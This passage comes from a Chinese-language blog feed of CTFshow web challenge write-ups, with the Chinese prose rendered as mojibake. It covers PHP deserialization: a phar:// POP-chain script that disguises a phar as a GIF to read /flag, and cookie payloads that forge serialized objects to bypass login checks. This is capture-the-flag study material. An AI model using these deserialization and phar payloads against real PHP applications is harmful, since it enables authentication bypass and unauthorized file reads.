å‡½æ•°ç›¸åï¼Œåœ¨å¯¹è±¡ä¸å†è¢«ä½¿ç”¨æ—¶(å°†æ‰€æœ‰è¯¥å¯¹è±¡çš„å¼•ç”¨è®¾ä¸ºnull)æˆ–è€…ç¨‹åºé€€å‡ºæ—¶è‡ªåŠ¨è°ƒç”¨</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('Just a fun "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fun</span><span class="token punctuation">.</span><span class="token string">"');self.location=document.referrer;&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$stat</span> <span class="token operator">=</span> @<span class="token function">stat</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ²¡æœ‰åºåˆ—åŒ–çš„ç‚¹ï¼ŒåŒæ—¶æ»¡è¶³ä¸Šä¼ ï¼Œæ‰€ä»¥æ˜¯åˆ©ç”¨ä¸Šä¼ pharæ–‡ä»¶ç„¶åphar://åè®®æ¥æ‰§è¡Œ</p><p><strong>åˆ©ç”¨phar://åè®®çš„æ¡ä»¶ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span>ã€èƒ½å°†pharæ–‡ä»¶ä¸Šä¼ <span class="token number">2</span>ã€å¯åˆ©ç”¨å‡½æ•° statã€fileatimeã€filectimeã€file_existsã€file_get_contentsã€file_put_contentsã€fileã€filegroupã€fopenã€fileinodeã€filemtimeã€fileownerã€filepermsã€is_dirã€is_executableã€is_fileã€is_linkã€is_readableã€is_writableã€is_writeableã€parse_ini_fileã€copyã€unlinkã€readfileã€md5_fileã€filesize<span class="token number">3</span>ã€å­˜åœ¨é­”æœ¯æ–¹æ³•<span class="token number">4</span>ã€<span class="token punctuation">:</span> <span class="token operator">/</span> phar è¿™äº›å­—ç¬¦æ²¡æœ‰ç»™è¿‡æ»¤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Fun</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">View</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token variable">$fn</span><span class="token operator">=</span><span class="token string">'/flag'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å®ä¾‹åŒ–å¯¹è±¡</span><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å®ä¾‹åŒ–å¯¹è±¡</span><span class="token variable">$d</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fun</span> <span class="token operator">=</span> <span class="token variable">$v</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ç¬¬ä¸€å±‚åµŒå¥—ï¼Œä¸ºäº†è§¦å‘invokeè€Œå‡†å¤‡çš„</span><span class="token variable">$new</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å†å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡</span><span class="token variable">$new</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fun</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ä¸ºè§¦å‘tostringè€Œå‡†å¤‡çš„</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//æ–‡ä»¶åï¼Œåç¼€åå¿…é¡»ä¸ºphar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">' __HALT_COMPILER();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//è®¾ç½®stub</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$new</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥å€’ç€çœ‹popé“¾é¦–å…ˆè®©<code>$new-&gt;fun = $d;</code>è€Œæ­¤æ—¶çš„$dæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œ$new-&gt;funä¼šåœ¨ææ„å‡½æ•°ä¸­è¢«å½“åšå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä¹Ÿå°±æ˜¯$dä¸€ä¸ªå¯¹è±¡è¢«ä½œä¸ºå­—ç¬¦ä¸²è¾“å‡ºï¼Œæ‰€ä»¥å°±ä¼šè°ƒç”¨tostringï¼Œæ­¤æ—¶<code>$d-&gt;fun = $v;</code>func=$vï¼Œè€Œ$vä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥æŠŠå¯¹è±¡å½“æˆä¸€ä¸ªå‡½æ•°è°ƒç”¨å°±ä¼šè§¦å‘ç±»viewä¸­çš„invokeæ–¹æ³•ï¼Œåˆå› ä¸ºfnå¯æ§æ‰€ä»¥å°±ä¼šè¯»å‡ºæˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210906185033106.png" alt="image-20210906185033106"></p><p>ç„¶åè§£ç å°±å¯ä»¥äº†</p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¯”èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowä¹‹web(å…­)</title>
      <link href="/2021/08/13/ctfshow-zhi-fan-xu-lie-hua/"/>
      <url>/2021/08/13/ctfshow-zhi-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="çŸ¥è¯†å‚¨å¤‡"><a href="#çŸ¥è¯†å‚¨å¤‡" class="headerlink" title="çŸ¥è¯†å‚¨å¤‡"></a>çŸ¥è¯†å‚¨å¤‡</h1><p><a href="https://www.cnblogs.com/zrp2013/category/491430.html" target="_blank" rel="noopener"><strong>éšç¬”åˆ†ç±» - PHPå¸¸è¯†</strong></a></p><p><strong>PHPä¸­çš„é­”æœ¯å˜é‡ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è°ƒç”¨ï¼ˆå½“ååºåˆ—åŒ–æ—¶å˜é‡ä¸ªæ•°ä¸å®é™…ä¸ç¬¦æ—¶ç»•è¿‡ï¼‰</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//å½“å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œä¼šè§¦å‘è¿›è¡Œåˆå§‹åŒ–</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼š <span class="token comment" spellcheck="true">//å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨,ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®ï¼ˆä¸å¯è®¿é—®çš„å±æ€§åŒ…æ‹¬ï¼š1.å±æ€§æ˜¯ç§æœ‰å‹ã€‚2.ç±»ä¸­ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡ï¼‰</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>åºåˆ—åŒ–å¯¹è±¡ï¼š</strong></p><p><code>privateå˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸ºï¼š\x00ç±»å\x00å˜é‡åprotectedå˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸º: \x00\*\x00å˜é‡åpublicå˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸ºï¼šå˜é‡å</code></p><h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"your flag is "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™å¥½åƒå¹¶æ²¡æœ‰ä½“ç°å‡ºæ¥ååºåˆ—åŒ–ï¼Œè€Œæ˜¯ç®€å•å¸®å¿™äº†è§£äº†ä¸€ä¸‹ç±»ï¼Œå‡½æ•°çš„è°ƒç”¨ï¼Œå€’æ˜¯æ›´åƒä»£ç å®¡è®¡äº†</p><p><strong>payloadï¼š</strong></p><pre><code>?username=xxxxxx&amp;password=xxxxxx</code></pre><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"your flag is "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ååºåˆ—åŒ–çš„ç‚¹åœ¨cookieçš„userä¸­ï¼Œæˆ‘ä»¬éœ€è¦è®©$isVip=true</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//è¿è¡Œç»“æœ</span>O<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"ctfShowUser"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"isVip"</span><span class="token punctuation">;</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span>O<span class="token operator">%</span><span class="token constant">3A11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bb<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre><code>?username=xxxxxx&amp;password=xxxxxxCookie:user=O:11:&quot;ctfShowUser&quot;:1:{s:5:&quot;isVip&quot;%3bb:1%3b}</code></pre><p>è®°å¾—urlç¼–ç </p><h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//æ­¤å¤„å¤šäº†ä¸€ä¸ªé™åˆ¶éœ€è¦ä¿®æ”¹äºŒè€…å…¶ä¸€</span>                    <span class="token keyword">echo</span> <span class="token string">"your flag is "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token 